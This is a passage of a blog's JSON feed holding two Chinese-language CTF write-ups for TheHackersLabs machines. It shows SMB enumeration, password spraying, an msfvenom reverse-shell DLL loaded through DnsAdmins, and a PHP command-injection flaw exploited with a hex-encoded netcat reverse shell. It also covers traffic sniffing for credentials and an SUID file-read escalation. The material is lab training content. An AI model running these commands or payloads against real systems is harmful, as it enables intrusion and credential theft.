type: general purpose\nRunning: Microsoft Windows 2016|2019\nOS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2019\nOS details: Microsoft Windows Server 2016 or Server 2019\nNetwork Distance: 1 hop\nService Info: Host: WIN-VRU3GG3DPLJ; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb-os-discovery:\n|   OS: Windows Server 2016 Datacenter 14393 (Windows Server 2016 Datacenter 6.3)\n|   Computer name: WIN-VRU3GG3DPLJ\n|   NetBIOS computer name: WIN-VRU3GG3DPLJ\\x00\n|   Domain name: DORAEMON.THL\n|   Forest name: DORAEMON.THL\n|   FQDN: WIN-VRU3GG3DPLJ.DORAEMON.THL\n|_  System time: 2025-08-03T10:53:48+02:00\n| smb-security-mode:\n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: required\n|_nbstat: NetBIOS name: WIN-VRU3GG3DPLJ, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:09:13:ba (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n| smb2-time:\n|   date: 2025-08-03T08:53:48\n|_  start_date: 2025-08-03T08:25:53\n|_clock-skew: mean: 5h19m54s, deviation: 1h09m16s, median: 5h59m54s\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.49 ms 192.168.10.5\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 17.86 seconds\n```\n\n### 枚举\n\n`SMB` 匿名\n\n```scheme\n➜  Doraemon nxc smb 192.168.10.5 -u anonymous -p '' --smb-timeout 9999 --shares         \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL) (signing:True) (SMBv1:True) \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\\anonymous: (Guest)\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [*] Enumerated shares\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  Share           Permissions     Remark\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  -----           -----------     ------\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  ADMIN$                          Admin remota\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  C$                              Recurso predeterminado\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  gorrocoptero    READ            \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  IPC$            READ            IPC remota\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  NETLOGON                        Recurso compartido del servidor de inicio de sesión \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  SYSVOL                          Recurso compartido del servidor de inicio de sesión \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  Users\n```\n\n有两个文件夹有读的权限，通过模块全部读出来\n\n```scheme\nnxc smb 192.168.10.5 -u anonymous -p '' --smb-timeout 9999 -M spider_plus -o DOWNOAD_FLAG=True\n```\n\n![image.png](/post-images/TheHackersLabsDoraemon/image1.png)\n\n得到一个 `txt` 文件，内容：\n\n```scheme\n➜  gorrocoptero cat kedadawapa.txt       \nAtención al grupo especial Dorayaki1 de Estepona\n\n- Doraemon: Â¡Hola, chicos! Â¿QuÃ© les parece si vamos a comer dorayakis hoy?\n\n- Nobita: Â¡SÃ­! Â¡Me encantan los dorayakis! Peroâ€¦ Â¿dÃ³nde vamos a conseguirlos?\n\n- Shizuka: He oÃ­do que hay una nueva tienda de dorayakis en la esquina de la calle. Â¡Dicen que son los mejores de la ciudad!\n\n- Suneo: Oh, por favor. Siempre hay algo nuevo. No puedo esperar para probarlos. Â¡Espero que sean mÃ¡s grandes que los de la tienda anterior!\n\n- Gigante: Â¡Quiero que sean enormes! Â¡Y que tengan mucho relleno! Si no, Â¡no me importa ir!\n\n- Doraemon: Bueno, podemos pedirle a Nobita que use el poder de la mÃ¡quina de tiempo para viajar al futuro y traernos unos dorayakis del aÃ±o 3000.\n\n- Nobita: Â¡Espera! No sÃ© si deberÃ­a usar la mÃ¡quina. La Ãºltima vez que lo hice, terminÃ© en un lugar lleno de robots rarosâ€¦\n\n- Shizuka: No te preocupes, Nobita. Solo vamos a la tienda. No necesitamos ir al futuro. Â¡Podemos ir a pie!\n\n- Suneo: Eso suena aburrido. Â¿Por quÃ© no hacemos una carrera? El primero en llegar a la tienda puede elegir el sabor de los dorayakis.\n\n- Gigante: Â¡Me encanta esa idea! Pero, Â¡tendrÃ¡s que correr rÃ¡pido para ganarme, Suneo!\n\n- Doraemon: Â¿Y si mejor vamos todos juntos? AsÃ­ disfrutamos del camino. AdemÃ¡s, Â¡puedo usar el futurÃ³fono para pedir un montÃ³n de dorayakis para que nos estÃ©n esperando!\n\n- Nobita: Â¡Esa es una gran idea, Doraemon! AsÃ­ no tengo que correr y me aseguro de que haya suficiente para todos.\n\n- Shizuka: Â¡Perfecto! Entonces, Â¡vamos a la tienda de dorayakis!\n\n- Suneo: Â¡SÃ­! Â¡Dorayakis, allÃ¡ vamos!\n\n- Gigante: Â¡No se olviden de mÃ­! Â¡Voy a ganar!\n\n- Doraemon: Â¡A comer dorayakis!\n```\n\n> 致：埃斯特波纳铜锣烧1特别组\n> \n> \n> 哆啦A梦：嘿，伙计们！今天我们去吃铜锣烧怎么样？\n> \n> 大雄：好啊！我超爱吃铜锣烧！可是……我们去哪儿买呢？\n> \n> 静香：我听说街角开了一家新的铜锣烧店。据说是城里最好吃的！\n> \n> 小夫：拜托。总是有新东西。我迫不及待想尝尝。希望比上一家的更大！\n> \n> 巨人：我想要个大号的！而且要多馅儿！如果不是，我也可以去！\n> \n> 哆啦A梦：好吧，我们可以请大雄用时光机的力量，穿越到未来，给我们带一些3000年的铜锣烧。\n> \n> 大雄：等等！我不知道该不该用这台机器。上次我用的时候，结果把我带到了一个满是奇怪机器人的地方……\n> \n> 静香：别担心，大雄。我们只是去商店而已。我们不用去未来。我们可以步行！\n> \n> 小夫：听起来很无聊。不如我们来个比赛？第一个到店的人可以选择铜锣烧的口味。\n> \n> 巨人：我喜欢这个主意！不过你得跑得快才能赢我，小夫！\n> \n> 哆啦A梦：我们一起去怎么样？这样我们就能享受旅程了。而且，我可以用未来手机订一堆等着我们的铜锣烧！\n> \n> 大雄：这主意太棒了，哆啦A梦！这样我就不用跑了，还能确保每个人都有足够的铜锣烧。\n> \n> 静香：太好了！那我们去铜锣烧店吧！\n> \n> 小夫：好的！铜锣烧，来啦！\n> \n> 巨人：别忘了我！我要赢！\n> \n> ——哆啦A梦：我们吃铜锣烧吧！\n> \n\n## 横向移动\n\n### Timeroast ❌\n\n```scheme\n➜  Timeroast python timeroast.py 192.168.10.5\n1000:$sntp-ms$6f6ee79d5defec4040b0f1bf4a84779e$1c0111e900000000000a0cff4c4f434cec399b9ba4dee858e1b8428bffbfcd0aec39acbe8d0ff10eec39acbe8d100f41\n```\n\n`hash` 保存为 `hash.txt` , `hashcat` 爆破\n\n```scheme\n./hashcat.bin -m 31300 hash.txt /usr/share/wordlists/rockyou.txt \n```\n\n没爆破出来\n\n### 域用户名枚举\n\n可能前面的是用户名，我们将其提取出来\n\n```scheme\n➜  gorrocoptero cat kedadawapa.txt | awk -F '- ' '{print $2}' |awk -F ':' '{print $1}'| sort | uniq | tee Domain_users.txt\n\nDoraemon\nGigante\nNobita\nShizuka\nSuneo\n```\n\n我们再对用户名进行测试\n\n```scheme\n➜  Doraemon nxc smb 192.168.10.5 -u Domain_users.txt -p '' --smb-timeout 9999 --continue-on-success --loggedon-users\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL) (signing:True) (SMBv1:True) \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\\: \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Doraemon: STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Gigante: STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Nobita: STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Shizuka: STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Suneo: STATUS_LOGON_FAILURE\n```\n\n提示 `STATUS_LOGON_FAILURE` 存在用户名，但是密码错了\n\n### **Kerberoast ❌**\n\n再枚举 `Kerberoast`\n\n```scheme\n➜  Doraemon GetNPUsers.py -dc-ip 192.168.10.5 doraemon.thl/ -usersfile Domain_users.txt              \n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[-] invalid principal syntax\n/root/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\n  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n[-] User Doraemon doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User Gigante doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User Nobita doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User Shizuka doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User Suneo doesn't have UF_DONT_REQUIRE_PREAUTH set\n```\n\n没法子，这里看了一下 `WP`，发现 txt 文件中的 `Dorayaki1` 是一个有效密码\n\n### 密码喷洒\n\n我们进行密码喷洒\n\n```scheme\n➜  Doraemon nxc smb 192.168.10.5 -u Domain_users.txt -p 'Dorayaki1' --smb-timeout 9999 --continue-on-success                 \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL) (signing:True) (SMBv1:True) \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\\:Dorayaki1 (Guest)\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\\Doraemon:Dorayaki1 \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Gigante:Dorayaki1 STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Nobita:Dorayaki1 STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Shizuka:Dorayaki1 STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Suneo:Dorayaki1 STATUS_LOGON_FAILURE\n```\n\n得到用户 `Doraemon` 的凭据\n\n测试凭据\n\n```scheme\n➜  Doraemon nxc ldap 192.168.10.5 -u 'Doraemon' -p 'Dorayaki1'                           \nLDAP        192.168.10.5    389    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL)\nLDAP        192.168.10.5    389    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\\Doraemon:Dorayaki1 \n\n➜  Doraemon nxc winrm 192.168.10.5 -u 'Doraemon' -p 'Dorayaki1'\nWINRM       192.168.10.5    5985   WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL)\n/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.\n  arc4 = algorithms.ARC4(self._key)\nWINRM       192.168.10.5    5985   WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\\Doraemon:Dorayaki1 (Pwn3d!)\n```\n\n### 域分析\n\n使用 `bloodhound-ce-python` 进行信息收集\n\n```scheme\n➜  Doraemon bloodhound-ce-python -u 'Doraemon' -p 'Dorayaki1' -d 'DORAEMON.THL' -ns 192.168.10.5 -dc 'WIN-VRU3GG3DPLJ.DORAEMON.THL' --zip -c All\nINFO: BloodHound.py for BloodHound Community Edition\nINFO: Found AD domain: doraemon.thl\nINFO: Getting TGT for user\nWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)\nINFO: Connecting to LDAP server: WIN-VRU3GG3DPLJ.DORAEMON.THL\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: WIN-VRU3GG3DPLJ.DORAEMON.THL\nINFO: Found 10 users\nINFO: Found 54 groups\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: WIN-VRU3GG3DPLJ.DORAEMON.THL\nINFO: Done in 00M 01S\nINFO: Compressing output into 20250803115152_bloodhound.zip\n```\n\n域用户组信息\n\n![image.png](/post-images/TheHackersLabsDoraemon/image2.png)\n\n在 `Bloodhound` 中没能找到什么可利用信息\n\n上 `winpeas` 能找到一个奇怪的文本文件\n\n![image.png](/post-images/TheHackersLabsDoraemon/image3.png)\n\n是一个凭据\n\n```scheme\n*Evil-WinRM* PS C:\\> cat 'C:\\Users\\Doraemon\\Links\\Carta de amor a Shizuka.txt'\nShizuka te doy la clave de mi corazon: ShizukaTeAmobb12345\n```\n\n密码喷洒\n\n```scheme\n➜  Doraemon nxc smb 192.168.10.5 -u Domain_users.txt -p 'ShizukaTeAmobb12345' --continue-on-success  \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL) (signing:True) (SMBv1:True) \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\\:ShizukaTeAmobb12345 (Guest)\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Doraemon:ShizukaTeAmobb12345 STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Gigante:ShizukaTeAmobb12345 STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Nobita:ShizukaTeAmobb12345 STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Shizuka:ShizukaTeAmobb12345 STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\\Suneo:ShizukaTeAmobb12345\n```\n\n是 `suneo` 的凭据，属于 `DNSADMINS` 和 `DORAYAKI` 组\n\n![image.png](/post-images/TheHackersLabsDoraemon/image4.png)\n\n通过 `BloodyAD` 查看可写，有很多\n\n![image.png](/post-images/TheHackersLabsDoraemon/image5.png)\n\n## 权限提升\n\n在 `HackTricks` 中能找到利用方法：https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html?highlight=DNSadmins#dnsadmins\n\n**DnsAdmins** 组的成员可以利用其权限在 DNS 服务器（通常托管在域控制器上）上加载具有 SYSTEM 权限的任意 `DLL`\n\n生成反弹 `shell` DLL\n\n```scheme\n➜  Doraemon msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.100 LPORT=4444 -f dll -o OMG.dll                                                                                  \n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 510 bytes\nFinal size of dll file: 9216 bytes\nSaved as: OMG.dll\n```\n\n使用以下命令使 `DNS` 服务器加载任意 `DLL`\n\n```scheme\n*Evil-WinRM* PS C:\\tools> dnscmd WIN-VRU3GG3DPLJ.DORAEMON.THL /config /serverlevelplugindll c:\\tools\\OMG.dll\n\nPropiedad del Registro serverlevelplugindll restablecida correctamente.\nComando completado correctamente.\n```\n\n然后重启服务\n\n```scheme\nsc.exe \\\\WIN-VRU3GG3DPLJ stop dns\nsc.exe \\\\WIN-VRU3GG3DPLJ start dns\n```\n\n![image.png](/post-images/TheHackersLabsDoraemon/image6.png)\n\n读取 `root.txt` 和 `user.txt`\n\n```powershell\nC:\\Users\\Administrador\\Desktop>type root.txt\ntype root.txt\nadvcrxxxxxxxxxxxxxxxxxxxxxxxxxx\n\nC:\\Users\\Suneo\\Desktop>type user.txt\ntype user.txt\nasfrexxxxxxxxxxxxxxxxxxx\n\nC:\\Users\\Administrador\\Desktop>whoami\nwhoami\nnt authority\\system\n```\n\n## 总结\n\n还行，就一开始的密码没猜到",
            "url": "https://www.sunsetaction.top/2025/08/03/TheHackersLabsDoraemon",
            "title": "TheHackersLabs - Doraemon",
            "summary": "Doraemon https://labs.thehackerslabs.com/machine/30 Recon PortScan 枚举 SMB 匿名 有两个文件夹有读的权限，通过模块全部读出来 得到一个 txt 文件，内容： 致：埃斯特波纳铜锣烧1特别组 哆啦A梦：嘿，伙计们！今天我们去吃铜锣烧...",
            "date_modified": "2025-08-03T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "TheHackersLabs",
                "Windows",
                "DNSADmins",
                "SMB",
                "CVE-2021-40469"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/08/02/TheHackersLabsHellRoot",
            "content_html": "\n# HellRoot\n\n> https://labs.thehackerslabs.com/machine/121\n> \n\n![image.png](/post-images/TheHackersLabsHellRoot/image.png)\n\n## Recon\n\n### PortScan\n\n```bash\n➜  HellRoot nmap -sT -min-rate 10000 -p- 192.168.56.95\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 15:08 CST\nNmap scan report for 192.168.56.95\nHost is up (0.00052s latency).\nNot shown: 65530 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n222/tcp  open  rsh-spx\n443/tcp  open  https\n5000/tcp open  upnp\nMAC Address: 08:00:27:5E:A1:66 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 3.73 seconds\n```\n\n```bash\n➜  HellRoot nmap -sT -A -p 22,80,222,443,5000 192.168.56.95\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 15:09 CST\nNmap scan report for 192.168.56.95\nHost is up (0.00076s latency).\n\nPORT     STATE SERVICE  VERSION\n22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)\n| ssh-hostkey:\n|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)\n|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)\n80/tcp   open  http     Apache httpd 2.4.62 ((Debian))\n|_http-server-header: Apache/2.4.62 (Debian)\n|_http-title: Apache2 Debian Default Page: It works\n222/tcp  open  ssh      OpenSSH 10.0 (protocol 2.0)\n443/tcp  open  ssl/http nginx 1.29.0\n| ssl-cert: Subject: commonName=git.hellroot.thl\n| Not valid before: 2025-07-17T18:18:57\n|_Not valid after:  2026-07-17T18:18:57\n|_ssl-date: TLS randomness does not represent time\n| tls-alpn:\n|   http/1.1\n|   http/1.0\n|_  http/0.9\n|_http-server-header: nginx/1.29.0\n|_http-title: Did not follow redirect to https://git.hellroot.thl/\n5000/tcp open  http     Apache httpd\n|_http-server-header: Apache\n|_http-title: Domain Lookup Service\nMAC Address: 08:00:27:5E:A1:66 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.76 ms 192.168.56.95\n```\n\n扫描出来有两个 `SSH` 服务，三个 `Web`\n\n### 枚举\n\n`192.168.56.5` 是 `Apache` 的默认页面\n\n![image.png](/post-images/TheHackersLabsHellRoot/image1.png)\n\n`https://git.hellroot.thl/` 是 `Gitea`\n\n![image.png](/post-images/TheHackersLabsHellRoot/image2.png)\n\n`http://git.hellroot.thl:5000/` 是域名解析一样的东西\n\n![image.png](/post-images/TheHackersLabsHellRoot/image3.png)\n\n测试了一下这个功能，貌似是使用 `dig` 来做域名解析，不过我这里使用仅主机所以无法进行解析\n\n![image.png](/post-images/TheHackersLabsHellRoot/image4.png)\n\n这里我也尝试了命令拼接，经过简单尝试没有哪里可以进行注入\n\n来到 `gitea` 能找到一个项目\n\n![image.png](/post-images/TheHackersLabsHellRoot/image5.png)\n\n将压缩包下载下来打开，是 `5000` 端口的源码\n\n有三个文件\n\n![image.png](/post-images/TheHackersLabsHellRoot/image6.png)\n\n在 `Dockerfile` 里面能发现一个用户密码，但是这里使用 `SSH` 无法进行登录\n\n```bash\n# Create user astro with passwordless sudo access only for /bin/su\nRUN useradd -m astro && echo \"astro:iloveastro\" | chpasswd && \\\n    echo \"astro ALL=(ALL:ALL) NOPASSWD: /bin/su\" > /etc/sudoers.d/astro-su && \\\n    chmod 440 /etc/sudoers.d/astro-su\n```\n\n并且 `222` 端口只能使用私钥进行登录\n\n## RCE 漏洞\n\n下边是`index.php` 的源码\n\n```bash\n<main>\n  <h1>Domain Lookup Service</h1>\n  <form method=\"POST\" action=\"\">\n    <label for=\"domain\">Enter Domain</label>\n    <input id=\"domain\" name=\"domain\" type=\"text\" placeholder=\"example.com\" required autocomplete=\"off\" />\n    <button type=\"submit\">Lookup DNS</button>\n  </form>\n\n<?php\nif ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['domain'])) {\n    $input = trim($_POST['domain']);\n    $decoded = @hex2bin($input);\n\n    // Always show raw output for debugging\n    ob_start();\n\n    if ($decoded !== false && ctype_print($decoded)) {\n        if (strpos($decoded, ';') !== false) {\n            // Remove header modification that breaks execution\n            $output = shell_exec($decoded . ' 2>&1');\n        } else {\n            $safeDomain = escapeshellarg($decoded);\n            $output = shell_exec(\"nslookup $safeDomain 2>&1\");\n        }\n    } else {\n        $safeDomain = escapeshellarg($input);\n        $output = shell_exec(\"nslookup $safeDomain 2>&1\");\n    }\n\n    echo '<pre class=\"result\">' . htmlspecialchars($output ?: 'No output returned.') . '</pre>';\n    ob_end_flush();\n}\n?>\n```\n\n很明显存在一个`RCE` 漏洞\n\n这里接收我们的参数 `domain` ，然后对其进行`16`进制编码\n\n```bash\n$input = trim($_POST['domain']);\n$decoded = @hex2bin($input);\n```\n\n然后下边判断解码是否成功，和是否为可以打印字符\n\n假如我们直接输入字符则进入 `else`\n\n```bash\n   if ($decoded !== false && ctype_print($decoded)) {\n        if (strpos($decoded, ';') !== false) {\n            // Remove header modification that breaks execution\n            $output = shell_exec($decoded . ' 2>&1');\n        } else {\n            $safeDomain = escapeshellarg($decoded);\n            $output = shell_exec(\"nslookup $safeDomain 2>&1\");\n        }\n    } else {\n\t\t    // 字符直接进入这里\n        $safeDomain = escapeshellarg($input);\n        $output = shell_exec(\"nslookup $safeDomain 2>&1\");\n    }\n```\n\n假如我们输入`16`进制，并且解码成功就会进入\n\n```bash\nif (strpos($decoded, ';') !== false) {\n            // Remove header modification that breaks execution\n            $output = shell_exec($decoded . ' 2>&1');\n        } else {\n            $safeDomain = escapeshellarg($decoded);\n            $output = shell_exec(\"nslookup $safeDomain 2>&1\");\n        }\n```\n\n`$output = shell_exec($decoded . ' 2>&1');` ，如果找到了分号，代码会直接将解码后的、未经任何处理的字符串 `$decoded` 传递给 `shell_exec` 函数执行\n\n我们尝试 `google.com;nc 192.168.56.5 80` ，然后转换为 `16` 进制\n\n![image.png](/post-images/TheHackersLabsHellRoot/image7.png)\n\n参数填入 `domian` 参数后成功执行\n\n![image.png](/post-images/TheHackersLabsHellRoot/image8.png)\n\n进行反弹 `shell`\n\n```bash\ngoogle.com;nc 192.168.56.5 1234 -e /bin/bash\n// To hex\n676f6f676c652e636f6d3b6e63203139322e3136382e35362e352031323334202d65202f62696e2f62617368\n```\n\n![image.png](/post-images/TheHackersLabsHellRoot/image9.png)\n\n## 网络嗅探\n\n当前我们在 `Docker` 环境里面\n\n```bash\nwww-data@05cc10128c04:/home$ ls -la /\ntotal 64\ndrwxr-xr-x   1 root root 4096 Jul 19 12:49 .\ndrwxr-xr-x   1 root root 4096 Jul 19 12:49 ..\n-rwxr-xr-x   1 root root    0 Jul 19 12:49 .dockerenv\n```\n\n找到一个文本文件\n\n```bash\nwww-data@05cc10128c04:/var/www/html$ cat sniff.txt \nPuede que haya ciertas herramientas que te permitan esnifar el trafico.\n```\n\n> 可能存在某些工具可以让你嗅探流量。\n> \n\n隐藏的 `.config` 文件夹\n\n```bash\nwww-data@05cc10128c04:/var/www/html/.config$\n```\n\n里面有 `dpkg` 的信息，能看到有 `tcpdump`\n\n![image.png](/post-images/TheHackersLabsHellRoot/image10.png)\n\n使用上面的得到的凭据切换用户\n\n```bash\nwww-data@05cc10128c04:/home$ su astro \nPassword: \n$ id\nuid=1001(astro) gid=1001(astro) groups=1001(astro)\n```\n\n再根据 `sudo -l` 的权限，可以直接切换到 `root`\n\n```bash\n$ sudo -l\nMatching Defaults entries for astro on 05cc10128c04:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser astro may run the following commands on 05cc10128c04:\n    (ALL : ALL) NOPASSWD: /bin/su\n$ sudo su root\nroot@05cc10128c04:/home# \n```\n\n我们再根据上边的文件进行网络嗅探\n\n![image.png](/post-images/TheHackersLabsHellRoot/image11.png)\n\n但是直接抓并不能抓到什么有用的，想起来 `Gitea` 可以进行登录\n\n先提前开启抓包，然后在网站上个使用凭据登录\n\n```scheme\ntcpdump -i eth0 -A -w 1.pcap\n```\n\n![image.png](/post-images/TheHackersLabsHellRoot/image12.png)\n\n然后直接查看数据包，能得到一个凭据\n\n![image.png](/post-images/TheHackersLabsHellRoot/image13.png)\n\n但一开始并没想到这个是密码，因为我认为这是前端传过来加密数据\n\n然后在 `ssh` 进行密码碰撞，成功登录进去了\n\n![image.png](/post-images/TheHackersLabsHellRoot/image14.png)\n\n能读取到 `user.txt`\n\n![image.png](/post-images/TheHackersLabsHellRoot/image15.png)\n\n## 权限提升\n\n寻找存在 `suid` 权限的程序\n\n```scheme\nastro@hellroot:~$ find / -perm -u=s -type f 2>/dev/null\n/usr/local/bin/secmonitor\n/usr/local/bin/logview\n/usr/bin/chsh\n/usr/bin/sudo\n/usr/bin/newgrp\n/usr/bin/umount\n/usr/bin/passwd\n/usr/bin/mount\n/usr/bin/su\n/usr/bin/gpasswd\n/usr/bin/chfn\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n```\n\n有两个奇怪的程序 `logview` 和 `secmonitor`\n\n`logview` 能直接读文件，直接读 `root.txt`\n\n```scheme\nastro@hellroot:~$ logview ../../root/root.txt\n[logview] Running with administrative privileges\nDisplaying log: /var/log/../../root/root.txt\nf03xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n```",
            "url": "https://www.sunsetaction.top/2025/08/02/TheHackersLabsHellRoot",
            "title": "TheHackersLabs - HellRoot",
            "summary": "HellRoot https://labs.thehackerslabs.com/machine/121 Recon PortScan 扫描出来有两个 SSH 服务，三个 Web 枚举 192.168.56.5 是 Apache 的默认页面 https://git.hellroot.thl/ 是 G...",
            "date_modified": "2025-08-02T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "TheHackersLabs",
                "Linux",
                "RCE",
                "Logview"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/07/31/群U靶机 - Cliv2",
